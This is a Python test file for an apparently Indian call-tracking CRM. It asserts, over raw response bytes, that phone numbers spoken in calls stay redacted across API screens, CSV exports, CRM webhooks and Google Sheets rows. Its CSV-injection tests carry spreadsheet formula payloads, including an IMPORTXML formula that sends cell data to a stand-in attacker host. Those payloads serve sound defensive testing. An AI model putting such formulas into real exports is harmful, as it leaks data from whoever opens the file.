"""Every door a transcript or a phone number can leave by, tested as BYTES.

Hard rule 5 says `text_redacted` in every API response and raw only behind a role check
plus an audit write. Hard rule 6 says the same values never reach a log. Both are
properties of a WHOLE SURFACE, and this product has more than one surface: the calls
list, the call detail, the lead list, the lead detail, the lead timeline, the
needs-attention queue, the lead-source activity view, the CSV export, the signed CRM
webhook and the Google Sheets row. A redaction that holds on nine of those is not a
redaction.

WHY THIS FILE EXISTS BESIDE THE ONES THAT ALREADY TEST PIECES OF IT
-------------------------------------------------------------------
`call_summary_redaction_test` proves the summary column is masked, `outbound_sync_test`
proves `lead_payload` masks a phone, `raw_pii_export_test` proves the export is
role-gated. Each asserts on a FIELD of a Python object. Two failure modes survive that:

1. **A test that asserts on a field the payload does not contain passes for the wrong
   reason.** `assert body["phone"] != NUMBER` is green when the key is absent, when the
   list is empty, and when the route 500s into a fixture that swallows it.
2. **A field is not the wire.** The number can ride out in a *different* key — a
   free-form `data` dict, a `detail` sentence, an error string, a mapping rename — and a
   per-field assertion cannot see any of those.

So every assertion here is `NUMBER not in response.content`, over the bytes the client
receives (or, for the webhook, the bytes handed to the socket), and every one of them is
paired with a POSITIVE assertion that the surface really did return the object — an
empty page also contains no phone number.

THE FIXTURE CARRIES REAL-SHAPED NUMBERS, and two of them, deliberately:

* `LEAD_NUMBER` is the lead's own contact number. Since D-436 it is shown IN FULL on
  every screen behind the ordinary `leads:read` gate — it is the client's own captured
  customer data and the field that makes a lead actionable — and it still leaves in the
  CSV only through the role-gated, audit-logged export. What is asserted about it here
  is therefore no longer "it is masked" but the two things that ARE still true: it never
  reaches a NEIGHBOUR (§4, RLS), and it never reaches a THIRD-PARTY system — the signed
  CRM webhook and the Google Sheets row — unless that endpoint holds the raw-phone
  opt-in (§3). Those are consent decisions about data leaving us, not display rules.
* `CALLER_NUMBER` is a number the caller reads out loud DURING the call. It exists only
  inside the transcript and the summary derived from it. There is no surface at all,
  including the CSV, on which it may appear without `calls:read_raw` and an audit row.

Both satisfy the national numbering plan (10 digits, leading 9) so `redact()` actually
fires on them — a fixture whose "phone number" is `12345` proves that a regex did not
match, not that a redaction worked.
"""

from __future__ import annotations

import csv
import io
import json
import uuid
from typing import Any

import httpx
import pytest
from apps.api.core.spreadsheet_safety import FORMULA_LEADERS
from apps.api.crm import service as crm
from apps.api.db.base import uuid7
from apps.api.db.session import tenant_session, untenanted_session
from apps.api.integrations import service as integrations
from apps.workers import sheets_sync
from apps.workers.outbound_webhooks import deliver_outbound_webhook
from apps.workers.redaction import redact
from sqlalchemy import text
from tests.api_security_test import _client, _make_tenant

#: The lead's own number. Unmasked ONLY in the audited CSV export.
LEAD_NUMBER = "+919876543210"
#: A number spoken inside the call. Never leaves unredacted, by any door.
CALLER_NUMBER = "+919812345678"
#: The digits without the country code — what a naive `in` check on the E.164 string
#: would miss if a surface rendered the national form instead.
LEAD_DIGITS = LEAD_NUMBER.removeprefix("+91")

#: The leaders that make a cell EXECUTE, as opposed to the two that make it shift a
#: parse. `\t` and `\r` are in `FORMULA_LEADERS` because a value starting with either is
#: its own hazard — but a leading `\t` is also OWASP's Excel mitigation and therefore
#: exactly what a correctly disarmed cell looks like, so a sweep that rejected it would
#: reject the fix. `\r` stays rejected: nothing produces it deliberately.
EXECUTABLE_LEADERS = frozenset(FORMULA_LEADERS) - {"\t"}

#: A third real-shaped mobile, for the pipeline test's own transcript. Distinct from the
#: two above so a leak can be attributed to the surface it came out of.
SPOKEN_IN_CALL = "9876512345"

RAW_TURN = f"caller: Naa number {CALLER_NUMBER}, malli call cheyandi."
RAW_SUMMARY = f"Caller asked for a callback on {CALLER_NUMBER}."


def _both_spellings(number: str) -> tuple[str, ...]:
    """E.164 and the bare national digits. A surface that strips `+91` still leaked."""
    return (number, number.removeprefix("+91"))


class Fixture:
    """One tenant with one lead, one completed call, a transcript and a timeline."""

    def __init__(self, tenant_id: uuid.UUID, slug: str, token: str) -> None:
        self.tenant_id = tenant_id
        self.slug = slug
        self.token = token
        self.lead_id = uuid7()
        self.call_id = uuid7()

    @property
    def headers(self) -> dict[str, str]:
        return {"Authorization": f"Bearer {self.token}", "X-Org-Slug": self.slug}


async def _fixture(role: str = "owner") -> Fixture:
    tenant_id, slug, token = await _make_tenant(role)
    fx = Fixture(tenant_id, slug, token)
    async with tenant_session(tenant_id) as session:
        agent_id = (await session.execute(text("SELECT id FROM agents LIMIT 1"))).scalar()
        await session.execute(
            text(
                "INSERT INTO leads (id, tenant_id, agent_id, phone_e164, name, status, source, "
                "data, schema_version, created_at, updated_at) VALUES (:id, :tid, :aid, :phone, "
                "'Ravi Kumar', 'hot', 'inbound_call', CAST(:data AS jsonb), 1, now(), now())"
            ),
            {
                "id": fx.lead_id,
                "tid": tenant_id,
                "aid": agent_id,
                "phone": LEAD_NUMBER,
                # The tenant's OWN extraction payload — acknowledged as a passthrough by
                # `scripts/check_redaction_exposure.py`. It must not become a smuggling
                # route for the number that came out of the transcript.
                "data": json.dumps({"intent": "book"}),
            },
        )
        await session.execute(
            text(
                "INSERT INTO calls (id, tenant_id, agent_id, lead_id, engine_call_id, direction, "
                "status, from_e164, summary, sentiment, outcome_tag, started_at, ended_at, "
                "duration_s, created_at, updated_at) VALUES (:id, :tid, :aid, :lid, :ecid, "
                "'inbound', 'completed', :from_e, :summary, 'positive', 'needs_follow_up', "
                "now(), now(), 61, now(), now())"
            ),
            {
                "id": fx.call_id,
                "tid": tenant_id,
                "aid": agent_id,
                "lid": fx.lead_id,
                "ecid": f"egress_{fx.call_id.hex}",
                "from_e": LEAD_NUMBER,
                # Stored RAW, exactly as `workers.pipeline._persist_extraction` writes it.
                "summary": RAW_SUMMARY,
            },
        )
        await session.execute(
            text(
                "INSERT INTO transcript_turns (id, tenant_id, call_id, idx, speaker, text, "
                "text_redacted, lang, start_ms, created_at, updated_at) VALUES (:id, :tid, :cid, "
                "0, 'caller', :raw, :red, 'te-IN', 0, now(), now())"
            ),
            {
                "id": uuid7(),
                "tid": tenant_id,
                "cid": fx.call_id,
                "raw": RAW_TURN,
                "red": redact(RAW_TURN).text,
            },
        )
        await session.execute(
            text(
                "INSERT INTO lead_events (id, tenant_id, lead_id, type, payload, actor, "
                "created_at, updated_at) VALUES (:id, :tid, :lid, 'call', CAST(:p AS jsonb), "
                "'system', now(), now())"
            ),
            {
                "id": uuid7(),
                "tid": tenant_id,
                "lid": fx.lead_id,
                "p": json.dumps({"call_id": str(fx.call_id), "status": "completed"}),
            },
        )
    return fx


def _assert_clean(response: httpx.Response, *, must_contain: str) -> bytes:
    """No spoken number, in either spelling — and the surface really did answer.

    `must_contain` is the anti-vacuity half. Without it every assertion below is also
    satisfied by a 500 body, an empty list and a page of somebody else's rows.
    """
    assert response.status_code == 200, response.text
    body = response.content
    assert must_contain.encode() in body, (
        f"the surface returned nothing recognisable ({must_contain!r} absent), so the "
        "absence of a phone number below proves nothing"
    )
    for spelling in _both_spellings(CALLER_NUMBER):
        assert spelling.encode() not in body, (
            f"a number spoken inside the call left on this surface as {spelling!r}"
        )
    return body


# --- 1. the read surfaces a client looks at every day --------------------------


@pytest.mark.parametrize(
    ("path", "marker"),
    [
        ("/v1/calls", "needs_follow_up"),
        ("/v1/leads", "Ravi Kumar"),
        ("/v1/attention", "items"),
        ("/v1/lead-sources/activity", "items"),
    ],
)
async def test_no_list_surface_carries_a_number_spoken_in_a_call(path: str, marker: str) -> None:
    """The four list screens, over HTTP, as bytes."""
    fx = await _fixture()
    async with _client() as http:
        response = await http.get(path, headers=fx.headers)
    _assert_clean(response, must_contain=marker)


async def test_the_call_list_and_detail_carry_the_callers_own_number_in_full() -> None:
    """The counterparty's number, on the two screens a missed call is worked from.

    NEW WITH D-436 and pinned here rather than only in the web suite, because the
    decision is a SERVER one: `caller_e164` replaced `caller_masked`, and the value is
    `from_e164` on an inbound leg. Asserted as bytes for the same reason everything else
    in this file is — a field assertion passes when the key is absent.

    The pairing is the point of the file: the number the caller DIALLED FROM is theirs
    and the client's to act on, while a number they SPOKE mid-call lives only in the
    transcript and is absent from both responses (`_assert_clean`, hard rule 5).
    """
    fx = await _fixture()
    async with _client() as http:
        listing = await http.get("/v1/calls", headers=fx.headers)
        detail = await http.get(f"/v1/calls/{fx.call_id}", headers=fx.headers)

    _assert_clean(listing, must_contain="needs_follow_up")
    _assert_clean(detail, must_contain="transcript")
    assert listing.json()[0]["caller_e164"] == LEAD_NUMBER
    assert detail.json()["caller_e164"] == LEAD_NUMBER


async def test_the_call_detail_redacts_both_the_turn_and_the_summary() -> None:
    """The detail is where the transcript actually is, so it is the strongest case.

    Positive assertions on both halves: the redacted turn must be PRESENT (a detail with
    no turns would pass the absence check for free), and the summary must be the masked
    rendering rather than simply missing.
    """
    fx = await _fixture()
    async with _client() as http:
        response = await http.get(f"/v1/calls/{fx.call_id}", headers=fx.headers)
    body = _assert_clean(response, must_contain="transcript")
    payload = json.loads(body)
    assert payload["transcript"], "the detail returned no turns at all"
    turn = payload["transcript"][0]
    assert turn["redacted"] is True
    assert "[phone ••78]" in turn["text"], "the turn is the redacted view, not an empty one"
    assert payload["summary"] == crm.redacted_summary(RAW_SUMMARY)
    assert payload["summary"] and "[phone" in payload["summary"]


async def test_the_lead_detail_carries_its_own_number_and_the_timeline_carries_none() -> None:
    """Two surfaces, two different answers, and the difference is the point.

    THIS TEST ASSERTED THE OPPOSITE OF ITS FIRST HALF until D-436: the detail's own
    number had to be absent. It is now present in full — a lead nobody can ring is not a
    lead — and the assertion is inverted rather than dropped, so the new behaviour is
    pinned as deliberately as the old one was.

    The TIMELINE half is unchanged and was never about masking: the API projects each
    lead event into prose it composed (`crm.service._timeline_copy`) instead of
    serializing the stored payload, so no number is on that wire under any rule. A
    change that started echoing payloads would fail here.

    The spoken number (`CALLER_NUMBER`) is absent from BOTH, via `_assert_clean` — that
    is hard rule 5 and D-436 does not touch it.
    """
    fx = await _fixture()
    async with _client() as http:
        detail = await http.get(f"/v1/leads/{fx.lead_id}", headers=fx.headers)
        timeline = await http.get(f"/v1/leads/{fx.lead_id}/timeline", headers=fx.headers)

    # Different markers because the two responses are different shapes: the detail
    # names the lead, the timeline names what happened to it and never repeats the id.
    _assert_clean(detail, must_contain=str(fx.lead_id))
    _assert_clean(timeline, must_contain="Call completed")

    body = detail.json()
    assert body["phone_e164"] == LEAD_NUMBER, "the detail is where a callback starts"
    assert body["data"] == {"intent": "book"}, "the acknowledged passthrough is intact"

    for spelling in _both_spellings(LEAD_NUMBER):
        assert spelling.encode() not in timeline.content, (
            "the timeline projects events into prose; a number here means it began "
            "serializing stored payloads"
        )
    assert timeline.json()["items"], "the timeline returned no rows, so it proves nothing"


# --- 2. the one documented exception, and its gate -----------------------------


async def test_the_raw_transcript_route_is_the_only_door_and_it_writes_an_audit_row() -> None:
    """`calls:read_raw` returns the spoken number; `staff` cannot reach the route at all.

    This is the assertion that makes every "not in the bytes" above meaningful: if NO
    surface could produce the number, the fixture would be proving that the number is
    not in the database.
    """
    owner = await _fixture()
    _, staff_slug, staff_token = await _make_tenant("staff")

    async with _client() as http:
        allowed = await http.get(f"/v1/calls/{owner.call_id}/transcript/raw", headers=owner.headers)
        refused = await http.get(
            f"/v1/calls/{owner.call_id}/transcript/raw",
            headers={"Authorization": f"Bearer {staff_token}", "X-Org-Slug": staff_slug},
        )

    assert allowed.status_code == 200, allowed.text
    assert CALLER_NUMBER.encode() in allowed.content, (
        "the role-gated route did not return the raw text, so the fixture never held it"
    )
    assert refused.status_code == 403, refused.text

    async with untenanted_session() as session:
        audited = (
            await session.execute(
                text(
                    "SELECT count(*) FROM audit_log WHERE action = 'transcript.read_raw' "
                    "AND object_id = :cid"
                ),
                {"cid": str(owner.call_id)},
            )
        ).scalar()
    assert audited == 1, "raw disclosure without an audit row is hard rule 5 broken"


async def test_the_csv_export_carries_the_leads_number_and_never_the_spoken_one() -> None:
    """The file is the only unmasked door, and it is unmasked for ONE column.

    The distinction the export's docstring draws — the client's own contact data yes, a
    transcript no — is asserted here as bytes, because it is the difference between a
    lawful export and a transcript leak with a `.csv` extension.
    """
    fx = await _fixture()
    async with _client() as http:
        response = await http.get("/v1/leads/export.csv", headers=fx.headers)

    assert response.status_code == 200, response.text
    body = response.text
    assert LEAD_NUMBER in body, "the export exists to carry the contact number"
    for spelling in _both_spellings(CALLER_NUMBER):
        assert spelling not in body, "a spoken number reached a file with no redaction"
    # And no transcript-derived column is offered at all — the chooser cannot produce one.
    header = next(csv.reader(io.StringIO(body)))
    assert not {"Summary", "Transcript"} & set(header), header


async def test_the_export_audit_row_counts_leads_and_not_lines(
    caplog: pytest.LogCaptureFixture,
) -> None:
    """ "How many contacts left the building" is the number an incident reads.

    It was `csv_body.count("\\n") - 1`, and `QUOTE_ALL` keeps a newline INSIDE its cell —
    which is exactly what a lead whose name was pasted over two lines has. So the audit
    row said three contacts had left when one had, and the over-count grew with the rows
    a person is most likely to have pasted in. Counted by the query now.

    The fixture puts a real newline in a real column, because a test that exports one
    single-line row cannot tell the two implementations apart.
    """
    fx = await _fixture()
    async with tenant_session(fx.tenant_id) as session:
        await session.execute(
            text("UPDATE leads SET name = :n WHERE id = :id"),
            {"n": "Ravi Kumar\nSunrise Clinic\nHyderabad", "id": fx.lead_id},
        )
    with caplog.at_level("INFO", logger="apps.api.compliance.audit"):
        async with _client() as http:
            response = await http.get("/v1/leads/export.csv", headers=fx.headers)
    assert response.status_code == 200, response.text
    # The audit SUMMARY is not a column — `compliance.audit.write_audit` hashes the row
    # and emits the summary on the log stream (the JSONL artifact), through
    # `redact_mapping`. So the assertion reads the record the operator would read.
    records = [r for r in caplog.records if r.name == "apps.api.compliance.audit"]
    reported = [getattr(r, "rows", None) for r in records if hasattr(r, "rows")]
    assert reported, "the export wrote no audit record at all"

    async with tenant_session(fx.tenant_id) as session:
        actual = (
            await session.execute(text("SELECT count(*) FROM leads WHERE deleted_at IS NULL"))
        ).scalar()
    # Read from the database rather than hard-coded: `_make_tenant` seeds a lead of its
    # own, and a literal here would be a number that goes stale the day that changes —
    # and would then be asserting the fixture rather than the counting rule.
    assert reported[-1] == actual, (
        f"{actual} leads were exported and the audit record said {reported[-1]} — the "
        "count is measuring lines in the file, not contacts"
    )
    assert response.text.count("\n") > actual + 1, (
        "the newline in the name did not make the file longer than its rows, so the two "
        "counting implementations are indistinguishable here"
    )


async def test_every_csv_cell_is_disarmed_including_a_hostile_name_and_the_phone() -> None:
    """CSV injection, on the columns a caller controls AND the ones they do not.

    The phone column is the sharp one: `+91…` LEADS a formula, so an undisarmed export
    hands Excel an expression that evaluates to the number with its country code eaten.
    """
    fx = await _fixture()
    hostile = '=IMPORTXML("https://evil.example/?"&A1,"//x")'
    async with tenant_session(fx.tenant_id) as session:
        await session.execute(
            text("UPDATE leads SET name = :n WHERE id = :id"), {"n": hostile, "id": fx.lead_id}
        )
    async with _client() as http:
        response = await http.get("/v1/leads/export.csv", headers=fx.headers)

    rows = [row for row in csv.reader(io.StringIO(response.text)) if row]
    at = {label: i for i, label in enumerate(rows[0])}
    cells = rows[1]
    assert cells[at["Name"]] == f"\t{hostile}", "the hostile name is not tab-disarmed"
    assert cells[at["Phone"]] == f"\t{LEAD_NUMBER}", "E.164 leads a formula and must be disarmed"
    # And EVERY column, not the two named above: the guard is applied by the renderer to
    # whatever it is handed, so a column added to `crm.columns` tomorrow is covered here
    # without this test being edited — which is the property that failed last time.
    assert len(at) >= 8, f"the export lost columns; this sweep is weaker than it looks: {at}"
    for label, index in at.items():
        assert cells[index][:1] not in EXECUTABLE_LEADERS, (
            f"column {label!r} shipped a cell a spreadsheet would execute"
        )


# --- 3. what leaves us for somebody else's system ------------------------------


async def _endpoint(
    fx: Fixture, *, kind: str, events: tuple[str, ...], mapping: dict[str, Any] | None = None
) -> uuid.UUID:
    endpoint_id = uuid7()
    async with tenant_session(fx.tenant_id) as session:
        await session.execute(
            text(
                "INSERT INTO outbound_webhooks (id, tenant_id, kind, url, secret_ref, events, "
                "mapping, active, created_at, updated_at) VALUES (:id, :tid, :kind, :url, "
                "'whsec_egress_secret', :events, CAST(:map AS jsonb), true, now(), now())"
            ),
            {
                "id": endpoint_id,
                "tid": fx.tenant_id,
                "kind": kind,
                "url": (
                    "https://crm.example/hook"
                    if kind == integrations.WEBHOOK_KIND
                    else "https://docs.google.com/spreadsheets/d/1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789/edit"
                ),
                "events": list(events),
                "map": json.dumps(mapping or {}),
            },
        )
    return endpoint_id


async def test_the_signed_crm_webhook_body_carries_no_transcript_and_no_raw_phone(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The BYTES handed to the socket, captured from the transport.

    `outbound_sync_test` asserts `lead_payload()` masks. This asserts that the thing the
    receiver actually gets is masked — mapping renames, envelope wrapping, JSON
    serialization and all — which is the only claim that survives someone adding a field
    to the envelope.
    """
    fx = await _fixture()
    endpoint_id = await _endpoint(fx, kind=integrations.WEBHOOK_KIND, events=("call.completed",))
    sent: list[bytes] = []

    async def handler(request: httpx.Request) -> httpx.Response:
        sent.append(request.content)
        return httpx.Response(200)

    captured = httpx.AsyncClient(transport=httpx.MockTransport(handler))

    async def fake_deliver(**kwargs: Any) -> integrations.DeliveryResult:
        return await real_deliver(client=captured, **kwargs)

    real_deliver = integrations.deliver
    monkeypatch.setattr(integrations, "deliver", fake_deliver)

    outcome = await deliver_outbound_webhook(
        {"job_try": 1},
        {
            "tenant_id": str(fx.tenant_id),
            "endpoint_id": str(endpoint_id),
            "event": "call.completed",
            # Exactly what `workers.pipeline` enqueues, including its own `redact()` on
            # the summary. This test therefore covers the TRANSPORT half — that nothing
            # between the outbox row and the socket un-redacts, renames or re-serializes
            # the number back in. The PRODUCER half (that the pipeline redacts at all) is
            # a different claim and cannot be made from a hand-built payload, so it has
            # its own test below driving the real pipeline.
            "data": {
                "call_id": str(fx.call_id),
                "lead_id": str(fx.lead_id),
                "direction": "inbound",
                "duration_s": 61,
                "outcome": "needs_follow_up",
                "sentiment": "positive",
                "summary": redact(RAW_SUMMARY).text,
            },
            "delivery_id": str(uuid7()),
        },
    )
    await captured.aclose()

    assert outcome == "delivered 200", outcome
    assert sent, "nothing was POSTed, so this test proved nothing"
    body = sent[0]
    assert str(fx.call_id).encode() in body, "the receiver did not even get the call id"
    for spelling in _both_spellings(CALLER_NUMBER):
        assert spelling.encode() not in body, "a spoken number reached a third-party endpoint"
    assert b'"summary"' in body and b"[phone" in body, (
        "the summary must ship REDACTED, not be dropped — a missing key would pass the "
        "absence check above without proving redaction"
    )


async def test_the_post_call_pipeline_redacts_the_summary_before_it_enters_the_outbox(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The PRODUCER half, driven through the real pipeline rather than a hand-built dict.

    `workers.pipeline` is where the `call.completed` payload is composed, and it is the
    only place the summary can be redacted: the column it comes from
    (`calls.summary`) is stored RAW, and the delivery worker deliberately does not mask
    anything (`enqueue_events` is the last point that knows the endpoint). So a test that
    posts a payload it redacted itself proves the transport and nothing about the rule.

    The fake engine's own `SAMPLE_TURNS` end with a caller reading out
    `9876543210` — a real 10-digit mobile leading 9, which is what makes the offline
    extractor's summary (a transcript line, verbatim) carry a number at all. Without
    that the assertion below would be about an empty string.
    """
    from apps.api.engine import get_engine, reset_engine_cache
    from apps.workers.pipeline import ingest_engine_event, run_post_call_pipeline
    from tests.smoke_pipeline_test import _seed_tenant

    # The recording copy reaches the network, which this sandbox refuses at the proxy —
    # and the recording is not what this test is about. Same stub `smoke_pipeline_test`
    # applies, and only the fetch: everything downstream of it runs for real.
    async def _fake_copy(
        *, source_url: str, tenant_id: uuid.UUID, call_id: uuid.UUID, leg: str = "call"
    ) -> str:
        # `leg` NAMES WHICH OF A CALL'S TWO RECORDINGS (D-533): a call handed to a
        # person has a second one, and the two must not land on one key. Defaulted so
        # this stub reads the way the pipeline calls it for an ordinary call.
        suffix = "" if leg == "call" else "-transfer"
        return f"recordings/{tenant_id}/{call_id}{suffix}.mp3"

    monkeypatch.setattr("apps.workers.pipeline.copy_recording", _fake_copy)

    # The caller reads their number back at the END of the call, which is the turn the
    # offline extractor copies verbatim into `calls.summary` — so this is what makes the
    # summary carry a phone number at all. `SAMPLE_TURNS`' shipped last line is the
    # agent's sign-off, and with it the assertion below would be unfalsifiable (the guard
    # a few lines down says so out loud rather than passing quietly).
    monkeypatch.setattr(
        "apps.api.engine.fake.SAMPLE_TURNS",
        (
            ("agent", "Namaskaram, idi Sunrise Clinic AI assistant."),
            ("caller", "Naaku appointment kavali."),
            ("caller", f"Naa number {SPOKEN_IN_CALL}, malli call cheyandi."),
        ),
    )

    reset_engine_cache()
    engine = get_engine()
    execution_id = f"exec_{uuid.uuid4().hex[:12]}"
    agent_ref = "fakeagent_egress_" + uuid.uuid4().hex[:8]
    tenant_id, _ = await _seed_tenant(agent_ref)
    async with tenant_session(tenant_id) as session:
        await session.execute(
            text(
                "INSERT INTO outbound_webhooks (id, tenant_id, kind, url, secret_ref, events, "
                "active, created_at, updated_at) VALUES (:id, :tid, 'webhook', "
                "'https://crm.example/hook', 'whsec_egress', ARRAY['call.completed'], true, "
                "now(), now())"
            ),
            {"id": uuid7(), "tid": tenant_id},
        )

    engine.seed_inbound_call(
        call_id=execution_id,
        agent_ref=agent_ref,
        from_e164=f"+9198{uuid.uuid4().int % 100000000:08d}",
        to_e164="+911140000000",
    )
    await ingest_engine_event(
        {}, {"engine": "fake", "execution_id": execution_id, "engine_agent_ref": agent_ref}
    )
    async with tenant_session(tenant_id) as session:
        call_id = (
            await session.execute(
                text("SELECT id FROM calls WHERE engine_call_id = :e"), {"e": execution_id}
            )
        ).scalar()
    assert call_id is not None
    await run_post_call_pipeline(
        {},
        {
            "tenant_id": str(tenant_id),
            "call_id": str(call_id),
            "engine": "fake",
            "execution_id": execution_id,
        },
    )

    async with tenant_session(tenant_id) as session:
        stored = (
            await session.execute(text("SELECT summary FROM calls WHERE id = :c"), {"c": call_id})
        ).scalar()
        queued = (
            await session.execute(
                text(
                    "SELECT payload FROM outbox_messages WHERE job = 'deliver_outbound_webhook' "
                    "AND payload->>'tenant_id' = :tid AND payload->>'event' = 'call.completed'"
                ),
                {"tid": str(tenant_id)},
            )
        ).all()

    assert stored and SPOKEN_IN_CALL in stored, (
        "the stored summary carries no number, so the redaction below is unfalsifiable"
    )
    assert len(queued) == 1, "the completed call did not reach the outbound fan-out"
    sent_summary = queued[0][0]["data"]["summary"]
    assert sent_summary, "the summary was dropped rather than redacted"
    assert SPOKEN_IN_CALL not in sent_summary
    assert "[phone" in sent_summary, "masked by `redact()`, not merely truncated"


async def test_a_lead_event_masks_the_phone_on_the_wire_unless_the_endpoint_opted_in(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """`include_raw_phone` is the one opt-in, and it is per endpoint.

    Both directions asserted from the same fixture: a masked body proves the default, and
    an unmasked one from the opted-in endpoint proves the default is a CHOICE rather than
    an inability to send the number at all.
    """
    fx = await _fixture()
    default = await _endpoint(fx, kind=integrations.WEBHOOK_KIND, events=("lead.created",))
    opted = await _endpoint(
        fx,
        kind=integrations.WEBHOOK_KIND,
        events=("lead.created",),
        mapping={"include_raw_phone": True},
    )
    sent: dict[str, bytes] = {}

    async def run(endpoint_id: uuid.UUID, label: str) -> None:
        async def handler(request: httpx.Request) -> httpx.Response:
            sent[label] = request.content
            return httpx.Response(200)

        client = httpx.AsyncClient(transport=httpx.MockTransport(handler))

        async def fake_deliver(**kwargs: Any) -> integrations.DeliveryResult:
            return await real_deliver(client=client, **kwargs)

        monkeypatch.setattr(integrations, "deliver", fake_deliver)
        async with tenant_session(fx.tenant_id) as session:
            rows = (
                await session.execute(
                    text(
                        "SELECT payload FROM outbox_messages WHERE payload->>'endpoint_id' = :eid "
                        "ORDER BY created_at DESC LIMIT 1"
                    ),
                    {"eid": str(endpoint_id)},
                )
            ).first()
        assert rows is not None, "the fan-out wrote no outbox row for this endpoint"
        await deliver_outbound_webhook({"job_try": 1}, dict(rows[0]))
        await client.aclose()

    real_deliver = integrations.deliver
    async with tenant_session(fx.tenant_id) as session:
        fanned = await integrations.enqueue_event(
            session,
            tenant_id=fx.tenant_id,
            event="lead.created",
            data={
                "lead_id": str(fx.lead_id),
                "phone": LEAD_NUMBER,
                "name": "Ravi Kumar",
                "source": "webhook",
                "status": "new",
            },
        )
    assert fanned == 2, "both endpoints subscribe, so both must be in the fan-out"

    await run(default, "default")
    await run(opted, "opted")

    assert LEAD_NUMBER.encode() not in sent["default"], "the default endpoint got a raw number"
    assert LEAD_DIGITS.encode() not in sent["default"]
    assert b"[redacted]" in sent["default"], "masked, not dropped"
    assert LEAD_NUMBER.encode() in sent["opted"], "the opt-in is not a real opt-in"


async def test_a_sheets_row_and_its_header_are_both_disarmed_and_both_redacted() -> None:
    """The row a client's staff opens, cell by cell — HEADER INCLUDED.

    The header was the one cell set that never went through `_cell`, while the CSV
    export's own comment cited this writer as the rule it was copying ("EVERY CELL GOES
    THROUGH THE GUARD, HEADER INCLUDED — the Sheets writer's rule"). A heading is a cell:
    `columns` and `headers` are free strings on the endpoint's mapping JSONB.
    """
    columns = service_columns = integrations.sheet_columns("lead.created", {})
    assert service_columns, "no default column order — the rest of this test is vacuous"

    hostile_heading = '=HYPERLINK("https://evil.example","Click")'
    header = integrations.sheet_header(columns, {"headers": {"name": hostile_heading}})
    assert header[columns.index("name")] == f"'{hostile_heading}", (
        "a configured heading is a cell and must be disarmed like every other one"
    )
    assert header[-1] == integrations.SHEET_DELIVERY_HEADER, "our own column keeps its name"

    row = integrations.sheet_row(
        integrations.lead_payload(
            {
                "lead_id": "abc",
                "phone": LEAD_NUMBER,
                "name": '=IMPORTXML("https://evil.example"&A1,"//x")',
                "source": "webhook",
                "status": "new",
            },
            include_raw_phone=False,
        ),
        columns,
        "delivery-1",
    )
    assert len(row) == len(header), "a row shorter than its header shifts every value"
    joined = "".join(row)
    assert LEAD_NUMBER not in joined and LEAD_DIGITS not in joined, "the sheet got a raw number"
    for cell in row:
        assert cell[:1] not in EXECUTABLE_LEADERS, cell


async def test_a_sheets_append_never_reaches_a_transport_carrying_a_spoken_number() -> None:
    """End to end through `append_event`, with the transport captured.

    `call.completed` is the sheets event whose default columns include `summary`, so it
    is the one that could put transcript-derived prose into a spreadsheet.
    """
    captured: list[sheets_sync.SheetAppend] = []

    class Recorder:
        name = "recorder"

        async def append(self, request: sheets_sync.SheetAppend) -> sheets_sync.AppendResult:
            captured.append(request)
            return sheets_sync.AppendResult(sheets_sync.AppendStatus.APPENDED)

    original = sheets_sync.get_sheets_transport
    sheets_sync.get_sheets_transport = lambda: Recorder()
    try:
        result = await sheets_sync.append_event(
            endpoint={
                "url": "https://docs.google.com/spreadsheets/d/1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789/edit",
                "secret": "sm://google/sheets",
                "mapping": {},
            },
            event="call.completed",
            data={
                "call_id": "c-1",
                "lead_id": "l-1",
                "direction": "inbound",
                "duration_s": 61,
                "outcome": "needs_follow_up",
                "sentiment": "positive",
                "summary": redact(RAW_SUMMARY).text,
            },
            delivery_id="delivery-1",
        )
    finally:
        sheets_sync.get_sheets_transport = original

    assert result.delivered, result.error
    assert captured, "no append reached the transport, so this test proved nothing"
    cells = "".join(captured[0].values) + "".join(captured[0].header)
    assert "[phone" in cells, "the summary must be IN the row, redacted — not absent"
    for spelling in _both_spellings(CALLER_NUMBER):
        assert spelling not in cells, "a spoken number reached a client's spreadsheet"


# --- 4. cross-tenant (hard rule 1) ----------------------------------------------


async def test_a_neighbour_sees_none_of_it() -> None:
    """Zero rows, not a filtered view — on every surface this file tests."""
    fx = await _fixture()
    _, other_slug, other_token = await _make_tenant()
    headers = {"Authorization": f"Bearer {other_token}", "X-Org-Slug": other_slug}

    async with _client() as http:
        for path in ("/v1/leads", "/v1/calls", "/v1/attention"):
            response = await http.get(path, headers=headers)
            assert response.status_code == 200, response.text
            assert str(fx.lead_id).encode() not in response.content
            assert str(fx.call_id).encode() not in response.content
            for number in (LEAD_NUMBER, CALLER_NUMBER):
                for spelling in _both_spellings(number):
                    assert spelling.encode() not in response.content
        for path in (f"/v1/leads/{fx.lead_id}", f"/v1/calls/{fx.call_id}"):
            assert (await http.get(path, headers=headers)).status_code == 404
